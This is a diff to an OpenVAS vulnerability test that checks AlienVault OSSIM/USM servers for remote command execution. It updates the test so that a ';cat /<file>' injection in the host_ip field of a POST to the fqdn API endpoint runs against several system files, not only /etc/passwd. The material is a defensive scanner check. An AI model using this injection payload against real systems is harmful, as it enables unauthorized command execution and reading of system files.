@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_alienvault_ossim_usm_5.3.6.nasl 11025 2018-08-17 08:27:37Z cfischer $
+# $Id: gb_alienvault_ossim_usm_5.3.6.nasl 11747 2018-10-04 09:58:33Z jschulte $
 #
 # AlienVault OSSIM/USM Remote Command Execution
 #
@@ -28,8 +28,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140234");
-  script_version("$Revision: 11025 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:27:37 +0200 (Fri, 17 Aug 2018) $");
+  script_version("$Revision: 11747 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-04-03 17:33:13 +0200 (Mon, 03 Apr 2017)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -43,7 +43,7 @@ if(description)
 
   script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_ossim_web_detect.nasl");
+  script_dependencies("gb_ossim_web_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 40011);
   script_mandatory_keys("OSSIM/installed");
 
@@ -71,21 +71,28 @@ cpe_list = make_list( 'cpe:/a:alienvault:open_source_security_information_manage
 
 if( ! port = get_app_port( cpe:cpe_list ) ) exit( 0 );
 
-data = 'host_ip=' + get_host_ip()  + ';cat /etc/passwd';
+files = traversal_files("linux");
 
-req = http_post_req( port:port,
-                     url:"/av/api/1.0/system/local/network/fqdn",
-                     data:data,
-                     add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" )
-                   );
+foreach pattern( keys( files ) ) {
 
-buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+  file = files[pattern];
 
-if( buf =~ "root:.*:0:[01]:" )
-{
-  report = 'It was possible to execute `cat /etc/passwd` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
-  security_message( port:port, data:report );
-  exit( 0 );
+  data = 'host_ip=' + get_host_ip()  + ';cat /' + file;
+
+  req = http_post_req( port:port,
+                       url:"/av/api/1.0/system/local/network/fqdn",
+                       data:data,
+                       add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" )
+                     );
+
+  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+
+  if( egrep( string:buf, pattern:pattern ) )
+  {
+    report = 'It was possible to execute `cat /' + file + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
 exit( 99 );
